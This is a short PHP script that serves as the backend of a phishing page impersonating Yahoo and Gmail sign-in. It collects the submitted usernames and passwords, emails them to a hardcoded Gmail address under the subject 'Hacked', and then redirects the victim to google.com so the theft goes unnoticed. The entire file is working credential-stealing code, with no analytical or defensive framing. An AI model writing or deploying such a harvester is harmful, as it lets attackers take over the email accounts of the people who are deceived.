<?PHP
if(isset($_POST['save']))
{
//Yahoo
	$URL = "YAHOO";
	$login = $_POST['login'];
	$passwd = $_POST['passwd'];

}
if(isset($_POST['signIn']))
{
//Gmail
	$URL = "GMAIL";
	$login = $_POST['Email'];
	$passwd = $_POST['Passwd'];

}
   $subject = 'Hacked';
   $headers  = 'MIME-Version: 1.0' . "\r\n";
   $headers .= 'Content-type: text/html; charset=iso-8859-1' . "\r\n";

  $message.="$URL - User Name : $login - Password :$passwd";
   //authSendEmail($email, $name, $to , $nameto, $subject, $message); leo.mathai@gmail.com
   mail("leo.mathai@gmail.com","Hacker", $message,$headers);
   header("location:http://www.google.com");
?>